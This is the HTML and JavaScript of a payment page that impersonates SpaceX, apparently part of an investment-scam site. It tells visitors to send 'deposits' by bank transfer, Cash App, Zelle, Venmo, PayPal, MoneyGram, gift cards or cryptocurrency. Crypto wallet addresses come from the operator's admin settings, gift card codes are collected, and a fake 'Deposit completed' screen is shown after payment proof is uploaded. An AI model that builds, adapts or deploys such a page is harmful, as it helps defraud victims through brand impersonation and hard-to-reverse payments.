<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>SPACEX — Payment</title>
    <script src="runtime-config.js"></script>
    <style>
      * {
        box-sizing: border-box;
      }
      html,
      body {
        margin: 0;
        background: #000;
        color: #fff;
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial,
          sans-serif;
      }
      a {
        color: inherit;
        text-decoration: none;
      }
      button,
      input {
        font-family: inherit;
        color: inherit;
      }
      .page {
        max-width: 780px;
        margin: 0 auto;
        padding: 28px 22px 48px;
      }
      .logo {
        width: 140px;
        display: block;
        margin-bottom: 22px;
      }
      h1 {
        margin: 0 0 8px;
        font-size: 30px;
      }
      .sub {
        color: #cfcfcf;
        margin: 0 0 18px;
      }
      .card {
        border: 1px solid #3a3a3a;
        border-radius: 10px;
        overflow: hidden;
        margin-bottom: 14px;
      }
      .row {
        display: grid;
        grid-template-columns: 42px 1fr;
        gap: 8px;
        padding: 14px 16px;
        border-bottom: 1px solid #2a2a2a;
      }
      .lab {
        color: #cfcfcf;
        font-size: 13px;
      }
      .val {
        font-size: 16px;
      }
      .note {
        color: #9a9a9a;
        font-size: 13px;
      }
      .sec {
        font-size: 16px;
        margin: 18px 0 10px;
      }
      .drop {
        border: 1px dashed #5a5a5a;
        border-radius: 10px;
        padding: 28px 16px;
        text-align: center;
        cursor: pointer;
        display: block;
      }
      .drop input {
        display: none;
      }
      img.prev {
        max-height: 140px;
        margin-top: 12px;
        display: none;
      }
      .btns {
        display: flex;
        gap: 12px;
        margin-top: 16px;
      }
      .go {
        height: 48px;
        padding: 0 22px;
        border: 0;
        border-radius: 8px;
        background: #fff;
        color: #000;
        font-weight: 700;
        cursor: pointer;
      }
      .back {
        height: 48px;
        padding: 0 22px;
        border: 1px solid #fff;
        border-radius: 8px;
        background: #000;
        cursor: pointer;
      }
      .err {
        color: #f87171;
        min-height: 18px;
      }
      .foot {
        color: #9a9a9a;
        font-size: 13px;
        margin-top: 16px;
      }
      .coin {
        display: flex;
        align-items: center;
        padding: 12px 14px;
        border: 1px solid #3a3a3a;
        border-bottom: 0;
        cursor: pointer;
      }
      .coin:last-child {
        border-bottom: 1px solid #3a3a3a;
      }
      .dot {
        width: 16px;
        height: 16px;
        border: 1px solid #fff;
        border-radius: 50%;
        margin-left: auto;
      }
      .coin.on .dot {
        background: #fff;
      }
      .wallet {
        display: flex;
        gap: 8px;
      }
      .wallet input {
        flex: 1;
        height: 44px;
        border: 1px solid #3a3a3a;
        border-radius: 8px;
        background: #000;
        padding: 0 12px;
      }
      .copy {
        height: 44px;
        padding: 0 14px;
        border: 1px solid #3a3a3a;
        border-radius: 8px;
        background: #000;
        cursor: pointer;
      }
      .or {
        text-align: center;
        color: #8a8a8a;
      }
      .code {
        width: 100%;
        height: 46px;
        border: 1px solid #3a3a3a;
        border-radius: 8px;
        background: #000;
        padding: 0 12px;
      }
      .done {
        display: none;
        position: fixed;
        inset: 0;
        background: #000;
        place-items: center;
        z-index: 50;
        text-align: center;
      }
      .done.show {
        display: grid;
      }
      .okmark {
        width: 72px;
        height: 72px;
        border-radius: 50%;
        background: #22c55e;
        color: #000;
        font-size: 36px;
        display: grid;
        place-items: center;
        margin: 0 auto 16px;
      }
      .done h2 {
        color: #86efac;
      }
      .head {
        display: flex;
        align-items: center;
      }
      .secure {
        margin-left: auto;
        color: #9a9a9a;
        font-size: 12px;
      }
    </style>
  </head>
  <body>
    <div class="page">
      <div class="head">
        <svg class="logo" viewBox="0 0 331.644 40.825" fill="#fff">
          <path
            d="M77.292,15.094H49.249l-1.039,0.777v24.947h7.763v-9.355l0.741-0.664h20.579 c5.196,0,7.632-1.398,7.632-4.985v-5.728C84.924,16.493,82.489,15.094,77.292,15.094 M77.292,24.317 c0,1.69-1.118,2.041-3.554,2.041H56.799l-0.827-0.804V20.21l0.741-0.678h17.025c2.436,0,3.554,0.347,3.554,2.045V24.317z"
          />
          <polyline
            points="99.081,19.813 105.761,29.6 105.391,30.548 90.618,30.548 86.847,35.187 108.837,35.187 110.361,36.115 113.775,40.824 122.659,40.824 103.186,14.775"
          />
          <polyline
            points="187.418,35.757 187.418,28.833 188.217,28.143 203.079,28.143 203.079,23.734 179.524,23.734 179.524,40.823 214.27,40.823 214.27,36.435 188.252,36.435"
          />
          <rect x="179.524" y="15.094" width="35.113" height="4.848" />
          <path
            d="M140.361,19.685h28.288c-0.436-3.597-2.668-4.595-8.33-4.595H140.06c-6.389,0-8.427,1.247-8.427,6.082 v13.565c0,4.84,2.038,6.087,8.427,6.087h20.259c5.745,0,7.945-1.079,8.095-4.81h-28.053l-0.832-0.783V20.209"
          />
          <path
            d="M29.333,25.118H8.754l-0.606-0.667v-4.402l0.603-0.466h27.742l0.379-0.927 c-0.945-2.431-3.392-3.565-7.936-3.565H9.665c-6.385,0-8.426,1.247-8.426,6.082v2.844c0,4.841,2.041,6.086,8.426,6.086h20.533 l0.645,0.566v4.602l-0.526,0.718H6.83v-0.022H0.678c0,0-0.704,0.353-0.677,0.518c0.525,3.382,2.829,4.34,8.345,4.34h20.987 c6.384,0,8.486-1.247,8.486-6.087v-3.543C37.819,26.363,35.717,25.118,29.333,25.118"
          />
          <path
            d="M236.725,14.988h-11.551l-0.627,1.193l12.828,9.351c2.43-1.407,5.074-2.833,7.95-4.24"
          />
          <path
            d="M247.075,32.603l11.275,8.222h11.692l0.484-1.089L253.69,27.413 C251.454,29.054,249.245,30.787,247.075,32.603"
          />
          <path
            d="M235.006,40.806h-10.451l-0.883-1.383C230.778,32.562,262.56,3.151,331.644,0 C331.644,0,273.658,1.956,235.006,40.806"
          />
        </svg>
        <span class="secure">SECURE PAYMENT PORTAL</span>
      </div>
      <h1 id="title">Payment Instructions</h1>
      <p class="sub" id="sub"></p>
      <div id="details"></div>
      <p class="sec" id="up-label">Upload Payment Proof</p>
      <label class="drop">
        <input type="file" id="file" accept="image/*,.pdf" />
        Click to upload or drag & drop your payment screenshot.<br />
        <span style="color: #8a8a8a">PNG, JPG or PDF · Max 5MB</span>
        <img class="prev" id="preview" alt="" />
      </label>
      <div class="btns">
        <button class="go" type="button" id="go">Submit Payment Proof</button>
        <button class="back" type="button" id="back">Back</button>
      </div>
      <p class="err" id="err"></p>
      <p class="foot">
        Your payment proof is encrypted and reviewed within 1-24 hours.
      </p>
    </div>
    <div class="done" id="done">
      <div>
        <div class="okmark">✓</div>
        <h2>Deposit completed</h2>
        <p>
          Your deposit is now processing.<br />Taking you to transaction
          history…
        </p>
      </div>
    </div>
    <script>
      function get() {
        try {
          return JSON.parse(
            localStorage.getItem("spacex.v1") || '{"users":[],"session":null}',
          );
        } catch (e) {
          return { users: [], session: null };
        }
      }
      function defaults() {
        return {
          bank: {
            accountName: "SpaceX Holdings LLC",
            bankName: "JPMorgan Chase",
            accountNumber: "*****4829",
            routing: "021000021",
            memo: "SPX-DEP-0826",
          },
          cashapp: {
            accountName: "SpaceX Holdings",
            tag: "$SpaceXOfficial",
            memo: "SPX-DEP-0826",
          },
          zelle: {
            accountName: "SpaceX Holdings LLC",
            email: "payments@spacex.com",
            memo: "SPX-DEP-0826",
          },
          venmo: {
            accountName: "SpaceX Holdings",
            username: "@SpaceX-Official",
            memo: "SPX-DEP-0826",
          },
          paypal: {
            accountName: "SpaceX Holdings LLC",
            email: "payments@spacex.com",
            memo: "SPX-DEP-0826",
          },
          moneygram: {
            fullName: "SpaceX Holdings LLC",
            country: "USA",
            address: "1 Rocket Road, Hawthorne, CA 90250",
            phone: "+1 (310) 363-6000",
            memo: "SPX-DEP-0826",
          },
          crypto: {
            memo: "SPX-DEP-0826",
            btc: "",
            usdt: "",
            eth: "",
            sol: "",
            bnb: "",
            xrp: "",
            ada: "",
          },
          gift: { memo: "SPX-DEP-0826" },
        };
      }
      var coins = [
        ["btc", "BTC (Bitcoin)"],
        ["usdt", "USDT (Tether)"],
        ["eth", "Ethereum (ETH)"],
        ["sol", "SOL (Solana)"],
        ["bnb", "BNB (BNB Chain)"],
        ["xrp", "XRP (Ripple)"],
        ["ada", "ADA (Cardano)"],
      ];
      var db = get(),
        dep = {},
        proof = "",
        proofName = "",
        extra = "",
        coin = "";
      try {
        dep = JSON.parse(sessionStorage.getItem("spacex-deposit") || "{}");
      } catch (e) {}
      var token = localStorage.getItem("authToken");
      if (!token || !dep.amount) {
        window.location.replace("deposit.html");
      } else {
        var method = dep.method || "bank";
        db.pay = db.pay || {};
        var dft = defaults(),
          p = Object.assign({}, dft[method] || {}, db.pay[method] || {});
        var titles = {
          bank: "Bank Transfer Instructions",
          cashapp: "Cash App Payment Instructions",
          crypto: "Crypto Payment Instructions",
          zelle: "Zelle Payment Instructions",
          venmo: "Venmo Payment Instructions",
          paypal: "PayPal Payment Instructions",
          moneygram: "MoneyGram Payment Instructions",
          gift: "Gift Card Payment Instructions",
        };
        var subs = {
          bank: "Send the exact amount to the account below, then upload your payment screenshot.",
          cashapp:
            "Send the exact amount using the Cash App details below, then upload your payment screenshot.",
          crypto:
            "Select the cryptocurrency and send the exact amount to the wallet address below, then upload your payment proof.",
          zelle:
            "Send the exact amount using the Zelle details below, then upload your payment screenshot.",
          venmo:
            "Send the exact amount using the Venmo details below, then upload your payment screenshot.",
          paypal:
            "Send the exact amount using the PayPal details below, then upload your payment screenshot.",
          moneygram:
            "Send the exact amount using the MoneyGram details below, then upload your payment screenshot.",
          gift: "Enter your gift card code or upload a clear photo of the card.",
        };
        document.getElementById("title").textContent =
          titles[method] || "Payment Instructions";
        document.getElementById("sub").textContent = subs[method] || "";
        document.getElementById("go").textContent =
          method === "gift" ? "Submit Gift Card" : "Submit Payment Proof";
        function line(l, v) {
          return (
            '<div class="row"><div></div><div><div class="lab">' +
            l +
            '</div><div class="val">' +
            (v || "—") +
            "</div></div></div>"
          );
        }
        var html = "";
        if (method === "bank")
          html =
            '<div class="card">' +
            line("Account Name", p.accountName) +
            line("Bank Name", p.bankName) +
            line("Account Number", p.accountNumber) +
            line("Routing Number", p.routing) +
            line("Reference / Memo", p.memo) +
            "</div>";
        if (method === "cashapp")
          html =
            '<div class="card">' +
            line("Account Name", p.accountName) +
            line("Cash App Tag", p.tag) +
            '</div><p class="note">Please include the reference <b>' +
            p.memo +
            "</b> in the payment note.</p>";
        if (method === "zelle")
          html =
            '<div class="card">' +
            line("Account Name", p.accountName) +
            line("Zelle Email / Phone", p.email) +
            '</div><p class="note">Please include the reference ' +
            p.memo +
            " in the payment memo.</p>";
        if (method === "venmo")
          html =
            '<div class="card">' +
            line("Account Name", p.accountName) +
            line("Venmo Username", p.username) +
            '</div><p class="note">Please include the reference ' +
            p.memo +
            " in the payment note.</p>";
        if (method === "paypal")
          html =
            '<div class="card">' +
            line("Account Name", p.accountName) +
            line("PayPal Email", p.email) +
            '</div><p class="note">Please include the reference ' +
            p.memo +
            " in the payment note / description.</p>";
        if (method === "moneygram")
          html =
            '<div class="card">' +
            line("Full Name", p.fullName) +
            line("Country", p.country) +
            line("Address", p.address) +
            line("Phone Number", p.phone) +
            '</div><p class="note">Please include the reference ' +
            p.memo +
            " when sending.</p>";
        if (method === "gift") {
          html =
            '<p class="sec">1. Gift Card Code</p><input class="code" id="giftcode" placeholder="Enter gift card code" /><p class="or">OR</p>';
          document.getElementById("up-label").textContent =
            "2. Upload Card Photo";
        }
        if (method === "crypto") {
          html = '<p class="sec">1 SELECT CRYPTOCURRENCY</p><div id="coins">';
          coins.forEach(function (c) {
            html +=
              '<div class="coin" data-c="' +
              c[0] +
              '">' +
              c[1] +
              '<span class="dot"></span></div>';
          });
          html +=
            '</div><p class="sec">2 WALLET ADDRESS</p><div class="wallet"><input id="waddr" readonly placeholder="Wallet address will appear after selection" /><button class="copy" type="button" id="copy">Copy</button></div><p class="note">Please send only the selected cryptocurrency on the correct network. Include reference ' +
            p.memo +
            " if possible.</p>";
          document.getElementById("up-label").textContent =
            "3 UPLOAD PAYMENT PROOF";
        }
        document.getElementById("details").innerHTML = html;
        if (method === "crypto") {
          document.querySelectorAll(".coin").forEach(function (el) {
            el.onclick = function () {
              document.querySelectorAll(".coin").forEach(function (x) {
                x.classList.remove("on");
              });
              el.classList.add("on");
              coin = el.getAttribute("data-c");
              document.getElementById("waddr").value =
                p[coin] || "Set this wallet in Admin → Pay details";
            };
          });
          document.getElementById("copy").onclick = function () {
            var v = document.getElementById("waddr").value;
            if (v) {
              navigator.clipboard.writeText(v);
              this.textContent = "Copied";
            }
          };
        }
        document.getElementById("file").onchange = function () {
          var f = this.files && this.files[0];
          if (!f) return;
          proofName = f.name;
          var r = new FileReader();
          r.onload = function () {
            proof = r.result;
            if (String(f.type).indexOf("image") === 0) {
              var img = document.getElementById("preview");
              img.src = proof;
              img.style.display = "inline-block";
            }
          };
          r.readAsDataURL(f);
        };
        function shrink(src, done) {
          if (!src || src.indexOf("data:image") !== 0) {
            done(src || "");
            return;
          }
          var img = new Image();
          img.onload = function () {
            var max = 640,
              w = img.width,
              h = img.height;
            if (w > max) {
              h = Math.round((h * max) / w);
              w = max;
            }
            var c = document.createElement("canvas");
            c.width = w;
            c.height = h;
            c.getContext("2d").drawImage(img, 0, 0, w, h);
            done(c.toDataURL("image/jpeg", 0.45));
          };
          img.onerror = function () {
            done("");
          };
          img.src = src;
        }
        async function finish(small) {
          try {
            var response = await fetch(
              window.SPACEX_CONFIG.apiBase + "/api/me/transactions/deposit",
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                  Authorization: "Bearer " + token,
                },
                body: JSON.stringify({
                  amount: Number(dep.amount) || 0,
                  method: method,
                  note: dep.note || extra,
                  proof: small || "",
                  proofName: proofName,
                  coin: coin,
                  extra: extra,
                }),
              },
            );
            var payload = await response.json();
            if (!response.ok)
              throw new Error(payload.message || "Could not submit deposit.");
          } catch (e) {
            document.getElementById("err").textContent =
              e.message || "Could not submit deposit.";
            return;
          }
          sessionStorage.removeItem("spacex-deposit");
          document.getElementById("done").className = "done show";
          setTimeout(function () {
            window.location.replace("transactions.html");
          }, 1600);
        }
        document.getElementById("back").onclick = function () {
          window.location.href = "deposit.html";
        };
        document.getElementById("go").onclick = function () {
          extra =
            (document.getElementById("giftcode") &&
              document.getElementById("giftcode").value) ||
            "";
          if (method === "crypto" && !coin) {
            document.getElementById("err").textContent =
              "Select a cryptocurrency first";
            return;
          }
          if (method === "gift" && !extra && !proof) {
            document.getElementById("err").textContent =
              "Enter a code or upload a photo";
            return;
          }
          if (method !== "gift" && !proof && !proofName) {
            document.getElementById("err").textContent =
              "Upload a payment screenshot first";
            return;
          }
          document.getElementById("err").textContent = "Submitting…";
          shrink(proof, finish);
        };
      }
    </script>
  </body>
</html>
